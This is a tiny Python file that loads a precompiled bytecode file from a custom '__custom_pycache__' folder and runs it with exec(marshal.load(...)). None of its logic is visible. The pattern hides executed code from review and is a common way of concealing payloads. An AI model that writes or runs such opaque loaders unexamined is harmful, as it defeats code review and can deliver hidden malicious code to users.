
import marshal
import os

s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), '__custom_pycache__', 'params_22ad8d380fe949a6ae74ec4483da2ef8.cpython-xxx.pyc'), 'rb')
s.seek(16)
exec(marshal.load(s))
